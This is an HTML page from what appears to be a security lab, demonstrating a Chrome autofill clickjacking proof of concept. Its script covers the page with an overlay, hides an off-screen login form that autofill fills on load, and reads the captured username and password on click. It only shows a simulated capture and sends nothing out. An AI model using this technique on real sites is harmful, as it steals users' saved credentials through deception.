<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Autofill Clickjacking Demo — ZENTRIX Vuln Lab</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
body { margin: 0; overflow: hidden; font-family: 'Share Tech Mono', monospace; }

#warning-bar {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    z-index: 100001;
    background: #1a0000;
    color: #ff3366;
    padding: 10px 16px;
    font-size: 0.75rem;
    text-align: center;
    border-bottom: 2px solid #ff3366;
    letter-spacing: 1px;
}

#info-panel {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    z-index: 100001;
    background: rgba(0, 0, 0, 0.92);
    color: #00ff66;
    padding: 12px 20px;
    font-size: 0.7rem;
    border-top: 1px solid rgba(0, 255, 102, 0.3);
    line-height: 1.6;
}

#info-panel a { color: #00ff66; }

#overlay {
    position: fixed;
    top: 40px;
    left: 0;
    width: 100%;
    height: calc(100% - 40px);
    background: white;
    opacity: 0.9;
    z-index: 9999;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    font-size: 1.4rem;
    color: #333;
    font-weight: 600;
}

#overlay.hidden { display: none; }

.hiddenForm {
    position: absolute;
    left: -9999px;
    top: 0;
}

#capture-log {
    position: fixed;
    top: 50px;
    right: 16px;
    z-index: 100002;
    background: rgba(0, 0, 0, 0.85);
    border: 1px solid #ff3366;
    color: #ff3366;
    padding: 12px 16px;
    font-size: 0.7rem;
    max-width: 280px;
    display: none;
    line-height: 1.5;
}

#capture-log.visible { display: block; }
</style>
</head>
<body>

<div id="warning-bar">
    ⚠ AUTHORIZED SECURITY RESEARCH DEMO — Autofill Clickjacking PoC | Educational use only | Do not deploy against third parties
</div>

<div id="overlay">Click here to continue</div>

<div id="capture-log"></div>

<!-- Victim page that contains autofill fields -->
<iframe src="autofillpage.html"
        sandbox="allow-forms allow-scripts"
        style="position:fixed; top:40px; left:0; width:100%; height:calc(100% - 40px); z-index:10000; border:none;">
</iframe>

<!-- Hidden form that will be autofilled -->
<form id="victimForm" class="hiddenForm" autocomplete="on">
    <input name="username" autocomplete="username"/>
    <input name="password" autocomplete="current-password"/>
</form>

<div id="info-panel">
    [ DEMO 01 ] Chrome autofill clickjacking — overlay masks iframe; hidden form triggers autofill dropdown on load.
    <a href="index.html">← Back to Vuln Lab</a> · <a href="../index.html">Console</a>
</div>

<script>
/* Focus the hidden form as soon as the page loads.
   This triggers the browser's autofill dropdown. */
window.onload = function() {
    var f = document.getElementById('victimForm');
    if (f && f.elements && f.elements.length) {
        f.elements[0].focus();
    }
};

document.getElementById('overlay').addEventListener('click', function() {
    var f = document.getElementById('victimForm');
    var log = document.getElementById('capture-log');
    var username = f.elements['username'].value;
    var password = f.elements['password'].value;

    this.classList.add('hidden');

    if (username || password) {
        log.innerHTML = '[ CAPTURE SIMULATION ]<br>' +
            'username: ' + (username || '(empty)') + '<br>' +
            'password: ' + (password ? '••••••••' : '(empty)') + '<br><br>' +
            'In a real attack, credentials would be exfiltrated.';
        log.classList.add('visible');
    } else {
        log.innerHTML = '[ INFO ] Overlay dismissed.<br>If autofill populated the hidden form, values would be captured on click.';
        log.classList.add('visible');
    }
});

/* Monitor autofill population on hidden fields */
var f = document.getElementById('victimForm');
if (f) {
    f.addEventListener('input', function() {
        var log = document.getElementById('capture-log');
        if (f.elements['username'].value || f.elements['password'].value) {
            log.innerHTML = '[ AUTOFILL DETECTED ] Hidden form fields populated by browser autofill.';
            log.classList.add('visible');
        }
    });
}
</script>
</body>
</html>
